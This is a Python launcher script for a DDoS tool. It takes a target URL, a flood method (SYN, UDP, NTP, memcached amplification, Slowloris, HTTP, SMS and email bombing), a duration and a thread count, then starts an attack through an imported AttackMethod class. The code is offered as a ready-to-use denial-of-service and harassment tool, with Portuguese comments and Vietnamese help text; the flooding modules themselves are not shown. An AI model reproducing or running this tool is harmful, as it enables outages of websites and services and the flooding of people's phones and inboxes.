# -*- coding: utf-8 -*-
# Feito por Nuvem & TsK
# Importa os modulos
import os
import sys
import argparse

# Vai ao diretorio atual
os.chdir(os.path.dirname(os.path.realpath(__file__)))

try:
    from tools.crash import CriticalError
    import tools.addons.clean
    import tools.addons.logo
    import tools.addons.winpcap
    from tools.method import AttackMethod
except ImportError as err:
    CriticalError("Module bị lỗi", err)
    sys.exit(1)

# Analisa args
parser = argparse.ArgumentParser(description="Overload HTTP Attack")
parser.add_argument(
    "--target",
    type=str,
    metavar="<URL>",
    help="Url cần tấn công",
)
parser.add_argument(
    "--method",
    type=str,
    metavar="<HTTP>",
    help="Phương thức tấn công (SMS, EMAIL, SYN, UDP, NTP, POD, MEMCACHED, ICMP, SLOWLORIS, HTTP)",
)
parser.add_argument(
    "--time", type=int, default=1200, metavar="<time>", help="Thời gian tấn công (giây)"
)
parser.add_argument(
    "--threads", type=int, default=100, metavar="<threads>", help="Số luồng (1-200)"
)

# Obtem args
args = parser.parse_args()
threads = args.threads
time = args.time
method = str(args.method).upper()
target = args.target


if __name__ == "__main__":
    # Print help
    if not method or not target or not time:
        parser.print_help()
        sys.exit(1)

    # Executa ataque DDOS
    with AttackMethod(
        duration=time, name=method, threads=threads, target=target
    ) as Flood:
        Flood.Start()
